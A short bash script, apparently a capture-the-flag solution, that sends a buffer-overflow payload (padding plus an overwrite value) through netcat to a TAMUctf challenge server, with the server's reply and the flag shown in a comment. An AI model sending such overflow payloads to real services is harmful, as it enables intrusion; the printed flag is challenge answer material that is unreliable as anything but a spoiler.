#!/bin/bash
python -c "print 'A'*(0x30-0x10)+'\xef\xbe\x37\x13'" | nc challenges.tamuctf.com 4252

# Enter a string: Congratulations. Your string is not lame. Here you go: gigem{0per4tion_skuld_74757474757275}
